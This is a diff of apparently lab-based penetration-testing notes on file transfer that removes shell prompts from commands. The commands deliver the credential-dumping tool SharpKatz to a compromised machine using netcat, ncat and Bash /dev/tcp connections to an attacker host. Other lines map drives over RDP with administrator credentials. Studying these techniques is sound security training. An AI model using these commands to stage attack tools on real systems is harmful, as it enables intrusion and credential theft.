@@ -27,13 +27,13 @@ The target or attacking machine can initiate the connection, which is helpful if
 1. On the **compromised machine**, start Netcat listening with:
     
     ```
-    victim@target:~$ nc -l -p 8000 > SharpKatz.exe
+    nc -l -p 8000 > SharpKatz.exe
     ```
     
 2. From the **attacking host**, send the file with:
     
     ```
-    0xs5@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+    wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
     0xs5@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
     ```
     
@@ -43,13 +43,13 @@ The target or attacking machine can initiate the connection, which is helpful if
 1. On the **compromised machine**, start Ncat with:
     
     ```
-    victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+    ncat -l -p 8000 --recv-only > SharpKatz.exe
     ```
     
 2. From the **attacking host**, send the file with:
     
     ```
-    0xs5@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+    ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
     ```
     
 
@@ -60,13 +60,13 @@ Instead of listening on the compromised machine, we can:
 1. On the **attacking host**, listen with:
     
     ```
-    0xs5@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+    sudo ncat -l -p 443 --send-only < SharpKatz.exe
     ```
     
 2. On the **compromised machine**, connect to the attacker with:
     
     ```
-    victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+    ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
     ```
     
 
@@ -77,13 +77,13 @@ If Netcat/Ncat is unavailable on the compromised machine, Bash can perform read/
 1. On the **attacking host**:
     
     ```
-    0xs5@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+    sudo nc -l -p 443 -q 0 < SharpKatz.exe
     ```
     
 2. On the **compromised machine**:
     
     ```
-    victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+    cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
     ```
     
 
@@ -138,13 +138,13 @@ PowerShell Remoting, aka WinRM, can transfer files when HTTP, HTTPS, or SMB are 
     - Using `rdesktop`:
         
         ```
-        0xs5@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+        rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
         ```
         
     - Using `xfreerdp`:
         
         ```
-        0xs5@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+        xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
         ```
         
 2. **From Windows**:
